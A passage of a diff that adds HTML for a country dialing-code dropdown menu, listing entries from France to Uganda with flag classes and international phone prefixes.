+                  </span>
+                  <span class="country-code">
+                   France ‪(+33)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="yy" data-country-code="262">
+                  <span class="flag-yy">
+                  </span>
+                  <span class="country-code">
+                   French Dept/Terr in Indian Ocean ‪(+262)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="gf" data-country-code="594">
+                  <span class="flag-gf">
+                  </span>
+                  <span class="country-code">
+                   French Guiana ‪(+594)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="pf" data-country-code="689">
+                  <span class="flag-pf">
+                  </span>
+                  <span class="country-code">
+                   French Polynesia ‪(+689)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ga" data-country-code="241">
+                  <span class="flag-ga">
+                  </span>
+                  <span class="country-code">
+                   Gabon ‪(+241)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="gm" data-country-code="220">
+                  <span class="flag-gm">
+                  </span>
+                  <span class="country-code">
+                   Gambia ‪(+220)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ge" data-country-code="995">
+                  <span class="flag-ge">
+                  </span>
+                  <span class="country-code">
+                   Georgia ‪(+995)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="de" data-country-code="49">
+                  <span class="flag-de">
+                  </span>
+                  <span class="country-code">
+                   Germany ‪(+49)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="gh" data-country-code="233">
+                  <span class="flag-gh">
+                  </span>
+                  <span class="country-code">
+                   Ghana ‪(+233)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="gi" data-country-code="350">
+                  <span class="flag-gi">
+                  </span>
+                  <span class="country-code">
+                   Gibraltar ‪(+350)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="gr" data-country-code="30">
+                  <span class="flag-gr">
+                  </span>
+                  <span class="country-code">
+                   Greece ‪(+30)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="gl" data-country-code="299">
+                  <span class="flag-gl">
+                  </span>
+                  <span class="country-code">
+                   Greenland ‪(+299)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="gd" data-country-code="1473">
+                  <span class="flag-gd">
+                  </span>
+                  <span class="country-code">
+                   Grenada ‪(+1473)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="gp" data-country-code="590">
+                  <span class="flag-gp">
+                  </span>
+                  <span class="country-code">
+                   Guadeloupe ‪(+590)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="gu" data-country-code="1">
+                  <span class="flag-gu">
+                  </span>
+                  <span class="country-code">
+                   Guam ‪(+1)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="gt" data-country-code="502">
+                  <span class="flag-gt">
+                  </span>
+                  <span class="country-code">
+                   Guatemala ‪(+502)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="gn" data-country-code="224">
+                  <span class="flag-gn">
+                  </span>
+                  <span class="country-code">
+                   Guinea ‪(+224)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="gw" data-country-code="245">
+                  <span class="flag-gw">
+                  </span>
+                  <span class="country-code">
+                   Guinea-Bissau ‪(+245)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="gy" data-country-code="592">
+                  <span class="flag-gy">
+                  </span>
+                  <span class="country-code">
+                   Guyana ‪(+592)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ht" data-country-code="509">
+                  <span class="flag-ht">
+                  </span>
+                  <span class="country-code">
+                   Haiti ‪(+509)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="hn" data-country-code="504">
+                  <span class="flag-hn">
+                  </span>
+                  <span class="country-code">
+                   Honduras ‪(+504)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="hk" data-country-code="852">
+                  <span class="flag-hk">
+                  </span>
+                  <span class="country-code">
+                   Hong Kong ‪(+852)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="hu" data-country-code="36">
+                  <span class="flag-hu">
+                  </span>
+                  <span class="country-code">
+                   Hungary ‪(+36)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="is" data-country-code="354">
+                  <span class="flag-is">
+                  </span>
+                  <span class="country-code">
+                   Iceland ‪(+354)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="in" data-country-code="91">
+                  <span class="flag-in">
+                  </span>
+                  <span class="country-code">
+                   India ‪(+91)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="id" data-country-code="62">
+                  <span class="flag-id">
+                  </span>
+                  <span class="country-code">
+                   Indonesia ‪(+62)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="iq" data-country-code="964">
+                  <span class="flag-iq">
+                  </span>
+                  <span class="country-code">
+                   Iraq ‪(+964)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ie" data-country-code="353">
+                  <span class="flag-ie">
+                  </span>
+                  <span class="country-code">
+                   Ireland ‪(+353)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="il" data-country-code="972">
+                  <span class="flag-il">
+                  </span>
+                  <span class="country-code">
+                   Israel ‪(+972)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="it" data-country-code="39">
+                  <span class="flag-it">
+                  </span>
+                  <span class="country-code">
+                   Italy ‪(+39)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="jm" data-country-code="1876">
+                  <span class="flag-jm">
+                  </span>
+                  <span class="country-code">
+                   Jamaica ‪(+1876)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="jp" data-country-code="81">
+                  <span class="flag-jp">
+                  </span>
+                  <span class="country-code">
+                   Japan ‪(+81)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="jo" data-country-code="962">
+                  <span class="flag-jo">
+                  </span>
+                  <span class="country-code">
+                   Jordan ‪(+962)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ke" data-country-code="254">
+                  <span class="flag-ke">
+                  </span>
+                  <span class="country-code">
+                   Kenya ‪(+254)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ki" data-country-code="686">
+                  <span class="flag-ki">
+                  </span>
+                  <span class="country-code">
+                   Kiribati ‪(+686)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="kw" data-country-code="965">
+                  <span class="flag-kw">
+                  </span>
+                  <span class="country-code">
+                   Kuwait ‪(+965)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="kg" data-country-code="996">
+                  <span class="flag-kg">
+                  </span>
+                  <span class="country-code">
+                   Kyrgyzstan ‪(+996)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="la" data-country-code="856">
+                  <span class="flag-la">
+                  </span>
+                  <span class="country-code">
+                   Lao ‪(+856)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="lv" data-country-code="371">
+                  <span class="flag-lv">
+                  </span>
+                  <span class="country-code">
+                   Latvia ‪(+371)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="lb" data-country-code="961">
+                  <span class="flag-lb">
+                  </span>
+                  <span class="country-code">
+                   Lebanon ‪(+961)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ls" data-country-code="266">
+                  <span class="flag-ls">
+                  </span>
+                  <span class="country-code">
+                   Lesotho ‪(+266)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="lr" data-country-code="231">
+                  <span class="flag-lr">
+                  </span>
+                  <span class="country-code">
+                   Liberia ‪(+231)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="li" data-country-code="423">
+                  <span class="flag-li">
+                  </span>
+                  <span class="country-code">
+                   Liechtenstein ‪(+423)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="lt" data-country-code="370">
+                  <span class="flag-lt">
+                  </span>
+                  <span class="country-code">
+                   Lithuania ‪(+370)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="lu" data-country-code="352">
+                  <span class="flag-lu">
+                  </span>
+                  <span class="country-code">
+                   Luxembourg ‪(+352)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="mo" data-country-code="853">
+                  <span class="flag-mo">
+                  </span>
+                  <span class="country-code">
+                   Macao ‪(+853)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="mk" data-country-code="389">
+                  <span class="flag-mk">
+                  </span>
+                  <span class="country-code">
+                   Macedonia ‪(+389)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="mg" data-country-code="261">
+                  <span class="flag-mg">
+                  </span>
+                  <span class="country-code">
+                   Madagascar ‪(+261)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="mw" data-country-code="265">
+                  <span class="flag-mw">
+                  </span>
+                  <span class="country-code">
+                   Malawi ‪(+265)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="my" data-country-code="60">
+                  <span class="flag-my">
+                  </span>
+                  <span class="country-code">
+                   Malaysia ‪(+60)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="mv" data-country-code="960">
+                  <span class="flag-mv">
+                  </span>
+                  <span class="country-code">
+                   Maldives ‪(+960)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ml" data-country-code="223">
+                  <span class="flag-ml">
+                  </span>
+                  <span class="country-code">
+                   Mali ‪(+223)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="mt" data-country-code="356">
+                  <span class="flag-mt">
+                  </span>
+                  <span class="country-code">
+                   Malta ‪(+356)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="mh" data-country-code="692">
+                  <span class="flag-mh">
+                  </span>
+                  <span class="country-code">
+                   Marshall Islands ‪(+692)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="mq" data-country-code="596">
+                  <span class="flag-mq">
+                  </span>
+                  <span class="country-code">
+                   Martinique ‪(+596)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="mr" data-country-code="222">
+                  <span class="flag-mr">
+                  </span>
+                  <span class="country-code">
+                   Mauritania ‪(+222)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="mu" data-country-code="230">
+                  <span class="flag-mu">
+                  </span>
+                  <span class="country-code">
+                   Mauritius ‪(+230)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="mx" data-country-code="52">
+                  <span class="flag-mx">
+                  </span>
+                  <span class="country-code">
+                   Mexico ‪(+52)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="fm" data-country-code="691">
+                  <span class="flag-fm">
+                  </span>
+                  <span class="country-code">
+                   Micronesia ‪(+691)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="md" data-country-code="373">
+                  <span class="flag-md">
+                  </span>
+                  <span class="country-code">
+                   Moldova ‪(+373)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="mc" data-country-code="377">
+                  <span class="flag-mc">
+                  </span>
+                  <span class="country-code">
+                   Monaco ‪(+377)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="mn" data-country-code="976">
+                  <span class="flag-mn">
+                  </span>
+                  <span class="country-code">
+                   Mongolia ‪(+976)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="me" data-country-code="382">
+                  <span class="flag-me">
+                  </span>
+                  <span class="country-code">
+                   Montenegro ‪(+382)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ms" data-country-code="1664">
+                  <span class="flag-ms">
+                  </span>
+                  <span class="country-code">
+                   Montserrat ‪(+1664)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ma" data-country-code="212">
+                  <span class="flag-ma">
+                  </span>
+                  <span class="country-code">
+                   Morocco ‪(+212)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="mz" data-country-code="258">
+                  <span class="flag-mz">
+                  </span>
+                  <span class="country-code">
+                   Mozambique ‪(+258)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="na" data-country-code="264">
+                  <span class="flag-na">
+                  </span>
+                  <span class="country-code">
+                   Namibia ‪(+264)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="nr" data-country-code="674">
+                  <span class="flag-nr">
+                  </span>
+                  <span class="country-code">
+                   Nauru ‪(+674)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="np" data-country-code="977">
+                  <span class="flag-np">
+                  </span>
+                  <span class="country-code">
+                   Nepal ‪(+977)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="nl" data-country-code="31">
+                  <span class="flag-nl">
+                  </span>
+                  <span class="country-code">
+                   Netherlands ‪(+31)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="an" data-country-code="599">
+                  <span class="flag-an">
+                  </span>
+                  <span class="country-code">
+                   Netherlands Antilles ‪(+599)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="nc" data-country-code="687">
+                  <span class="flag-nc">
+                  </span>
+                  <span class="country-code">
+                   New Caledonia ‪(+687)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="nz" data-country-code="64">
+                  <span class="flag-nz">
+                  </span>
+                  <span class="country-code">
+                   New Zealand ‪(+64)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ni" data-country-code="505">
+                  <span class="flag-ni">
+                  </span>
+                  <span class="country-code">
+                   Nicaragua ‪(+505)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ne" data-country-code="227">
+                  <span class="flag-ne">
+                  </span>
+                  <span class="country-code">
+                   Niger ‪(+227)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ng" data-country-code="234">
+                  <span class="flag-ng">
+                  </span>
+                  <span class="country-code">
+                   Nigeria ‪(+234)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="nu" data-country-code="683">
+                  <span class="flag-nu">
+                  </span>
+                  <span class="country-code">
+                   Niue ‪(+683)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="mp" data-country-code="1">
+                  <span class="flag-mp">
+                  </span>
+                  <span class="country-code">
+                   Northern Mariana Islands ‪(+1)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="no" data-country-code="47">
+                  <span class="flag-no">
+                  </span>
+                  <span class="country-code">
+                   Norway ‪(+47)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="om" data-country-code="968">
+                  <span class="flag-om">
+                  </span>
+                  <span class="country-code">
+                   Oman ‪(+968)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="pk" data-country-code="92">
+                  <span class="flag-pk">
+                  </span>
+                  <span class="country-code">
+                   Pakistan ‪(+92)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="pw" data-country-code="680">
+                  <span class="flag-pw">
+                  </span>
+                  <span class="country-code">
+                   Palau ‪(+680)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="pa" data-country-code="507">
+                  <span class="flag-pa">
+                  </span>
+                  <span class="country-code">
+                   Panama ‪(+507)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="pg" data-country-code="675">
+                  <span class="flag-pg">
+                  </span>
+                  <span class="country-code">
+                   Papua New Guinea ‪(+675)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="py" data-country-code="595">
+                  <span class="flag-py">
+                  </span>
+                  <span class="country-code">
+                   Paraguay ‪(+595)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="pe" data-country-code="51">
+                  <span class="flag-pe">
+                  </span>
+                  <span class="country-code">
+                   Peru ‪(+51)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ph" data-country-code="63">
+                  <span class="flag-ph">
+                  </span>
+                  <span class="country-code">
+                   Philippines ‪(+63)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="pl" data-country-code="48">
+                  <span class="flag-pl">
+                  </span>
+                  <span class="country-code">
+                   Poland ‪(+48)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="pt" data-country-code="351">
+                  <span class="flag-pt">
+                  </span>
+                  <span class="country-code">
+                   Portugal ‪(+351)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="pr" data-country-code="1">
+                  <span class="flag-pr">
+                  </span>
+                  <span class="country-code">
+                   Puerto-Rico ‪(+1)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="qa" data-country-code="974">
+                  <span class="flag-qa">
+                  </span>
+                  <span class="country-code">
+                   Qatar ‪(+974)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="re" data-country-code="262">
+                  <span class="flag-re">
+                  </span>
+                  <span class="country-code">
+                   Reunion ‪(+262)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ro" data-country-code="40">
+                  <span class="flag-ro">
+                  </span>
+                  <span class="country-code">
+                   Romania ‪(+40)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ru" data-country-code="7">
+                  <span class="flag-ru">
+                  </span>
+                  <span class="country-code">
+                   Russia ‪(+7)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="rw" data-country-code="250">
+                  <span class="flag-rw">
+                  </span>
+                  <span class="country-code">
+                   Rwanda ‪(+250)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="sh" data-country-code="290">
+                  <span class="flag-sh">
+                  </span>
+                  <span class="country-code">
+                   Saint Helena ‪(+290)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="kn" data-country-code="1">
+                  <span class="flag-kn">
+                  </span>
+                  <span class="country-code">
+                   Saint Kitts and Nevis ‪(+1)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="lc" data-country-code="1758">
+                  <span class="flag-lc">
+                  </span>
+                  <span class="country-code">
+                   Saint Lucia ‪(+1758)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="pm" data-country-code="508">
+                  <span class="flag-pm">
+                  </span>
+                  <span class="country-code">
+                   Saint Pierre and Miquelon ‪(+508)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="vc" data-country-code="1">
+                  <span class="flag-vc">
+                  </span>
+                  <span class="country-code">
+                   Saint Vincent and the Grenadines ‪(+1)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ws" data-country-code="685">
+                  <span class="flag-ws">
+                  </span>
+                  <span class="country-code">
+                   Samoa ‪(+685)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="sm" data-country-code="378">
+                  <span class="flag-sm">
+                  </span>
+                  <span class="country-code">
+                   San Marino ‪(+378)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="st" data-country-code="239">
+                  <span class="flag-st">
+                  </span>
+                  <span class="country-code">
+                   Sao Tome and Principe ‪(+239)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="sa" data-country-code="966">
+                  <span class="flag-sa">
+                  </span>
+                  <span class="country-code">
+                   Saudi Arabia ‪(+966)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="sn" data-country-code="221">
+                  <span class="flag-sn">
+                  </span>
+                  <span class="country-code">
+                   Senegal ‪(+221)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="rs" data-country-code="381">
+                  <span class="flag-rs">
+                  </span>
+                  <span class="country-code">
+                   Serbia ‪(+381)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="sc" data-country-code="248">
+                  <span class="flag-sc">
+                  </span>
+                  <span class="country-code">
+                   Seychelles ‪(+248)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="sl" data-country-code="232">
+                  <span class="flag-sl">
+                  </span>
+                  <span class="country-code">
+                   Sierra Leone ‪(+232)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="sg" data-country-code="65">
+                  <span class="flag-sg">
+                  </span>
+                  <span class="country-code">
+                   Singapore ‪(+65)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="sk" data-country-code="421">
+                  <span class="flag-sk">
+                  </span>
+                  <span class="country-code">
+                   Slovakia ‪(+421)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="si" data-country-code="386">
+                  <span class="flag-si">
+                  </span>
+                  <span class="country-code">
+                   Slovenia ‪(+386)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="sb" data-country-code="677">
+                  <span class="flag-sb">
+                  </span>
+                  <span class="country-code">
+                   Solomon Islands ‪(+677)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="za" data-country-code="27">
+                  <span class="flag-za">
+                  </span>
+                  <span class="country-code">
+                   South Africa ‪(+27)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="kr" data-country-code="82">
+                  <span class="flag-kr">
+                  </span>
+                  <span class="country-code">
+                   South Korea ‪(+82)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="es" data-country-code="34">
+                  <span class="flag-es">
+                  </span>
+                  <span class="country-code">
+                   Spain ‪(+34)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="lk" data-country-code="94">
+                  <span class="flag-lk">
+                  </span>
+                  <span class="country-code">
+                   Sri Lanka ‪(+94)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="sr" data-country-code="597">
+                  <span class="flag-sr">
+                  </span>
+                  <span class="country-code">
+                   Suriname ‪(+597)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="sz" data-country-code="268">
+                  <span class="flag-sz">
+                  </span>
+                  <span class="country-code">
+                   Swaziland ‪(+268)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="se" data-country-code="46">
+                  <span class="flag-se">
+                  </span>
+                  <span class="country-code">
+                   Sweden ‪(+46)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ch" data-country-code="41">
+                  <span class="flag-ch">
+                  </span>
+                  <span class="country-code">
+                   Switzerland ‪(+41)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="tw" data-country-code="886">
+                  <span class="flag-tw">
+                  </span>
+                  <span class="country-code">
+                   Taiwan ‪(+886)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="tj" data-country-code="992">
+                  <span class="flag-tj">
+                  </span>
+                  <span class="country-code">
+                   Tajikistan ‪(+992)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="tz" data-country-code="255">
+                  <span class="flag-tz">
+                  </span>
+                  <span class="country-code">
+                   Tanzania ‪(+255)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="th" data-country-code="66">
+                  <span class="flag-th">
+                  </span>
+                  <span class="country-code">
+                   Thailand ‪(+66)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="tg" data-country-code="228">
+                  <span class="flag-tg">
+                  </span>
+                  <span class="country-code">
+                   Togo ‪(+228)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="tk" data-country-code="690">
+                  <span class="flag-tk">
+                  </span>
+                  <span class="country-code">
+                   Tokelau ‪(+690)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="to" data-country-code="676">
+                  <span class="flag-to">
+                  </span>
+                  <span class="country-code">
+                   Tonga ‪(+676)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="tt" data-country-code="1868">
+                  <span class="flag-tt">
+                  </span>
+                  <span class="country-code">
+                   Trinidad, Tobago ‪(+1868)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="tn" data-country-code="216">
+                  <span class="flag-tn">
+                  </span>
+                  <span class="country-code">
+                   Tunisia ‪(+216)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="tr" data-country-code="90">
+                  <span class="flag-tr">
+                  </span>
+                  <span class="country-code">
+                   Turkey ‪(+90)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="tm" data-country-code="993">
+                  <span class="flag-tm">
+                  </span>
+                  <span class="country-code">
+                   Turkmenistan ‪(+993)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="tc" data-country-code="1649">
+                  <span class="flag-tc">
+                  </span>
+                  <span class="country-code">
+                   Turks and Caicos ‪(+1649)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="tv" data-country-code="688">
+                  <span class="flag-tv">
+                  </span>
+                  <span class="country-code">
+                   Tuvalu ‪(+688)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="vi" data-country-code="1">
+                  <span class="flag-vi">
+                  </span>
+                  <span class="country-code">
+                   US Virgin Islands ‪(+1)‬
+                  </span>
+                 </a>
+                </li>
+                <li>
+                 <a href="#" role="menuitem" data-country-intl="ug" data-country-code="256">
+                  <span class="flag-ug">
+                  </span>
+                  <span class="country-code">
